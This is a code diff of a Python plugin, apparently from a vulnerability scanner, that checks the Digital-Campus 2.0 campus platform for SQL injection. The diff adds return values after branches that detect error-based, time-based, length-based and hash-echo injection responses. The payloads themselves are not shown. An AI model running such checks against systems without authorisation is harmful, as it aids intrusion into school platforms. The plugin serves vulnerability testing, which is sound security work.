@@ -36,6 +36,7 @@ class digital_campus_systemcodelist_sqli_BaseVerify:
         if r"DayNum" in reqlst[0] and r"DayNum" in reqlst[1]:
             if len(reqlst[0]) != len(reqlst[1]):
                 cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")
+                return True,vulnurl,"Digital-Campus2.0数字校园平台Sql注射",payload,req.text
             else:
                 cprint("[-]不存在digital_campus_systemcodelist_sqli漏洞", "white", "on_grey")
 
@@ -45,6 +46,7 @@ class digital_campus_systemcodelist_sqli_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.status_code == 500 and r"Microsoft SQL Server" in req.text:
                 cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "Digital-Campus2.0数字校园平台Sql注射", payload, req.text
             else:
                 cprint("[-]不存在digital_campus_systemcodelist_sqli漏洞", "white", "on_grey")
 
@@ -58,6 +60,7 @@ class digital_campus_systemcodelist_sqli_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if time.time() - start_time >= 6:
                 cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "Digital-Campus2.0数字校园平台Sql注射", payload, req.text
             else:
                 cprint("[-]不存在digital_campus_systemcodelist_sqli漏洞", "white", "on_grey")
 
@@ -71,6 +74,7 @@ class digital_campus_systemcodelist_sqli_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if time.time() - start_time >= 6:
                 cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "Digital-Campus2.0数字校园平台Sql注射", payload, req.text
             else:
                 cprint("[-]不存digital_campus_systemcodelist_sqli漏洞", "white", "on_grey")
 
@@ -83,6 +87,7 @@ class digital_campus_systemcodelist_sqli_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                 cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "Digital-Campus2.0数字校园平台Sql注射", payload, req.text
             else:
                 cprint("[-]不存在digital_campus_systemcodelist_sqli漏洞", "white", "on_grey")
 
@@ -96,11 +101,14 @@ class digital_campus_systemcodelist_sqli_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if time.time() - start_time >= 6:
                 cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "Digital-Campus2.0数字校园平台Sql注射", payload, req.text
             else:
                 cprint("[-]不存在digital_campus_systemcodelist_sqli漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
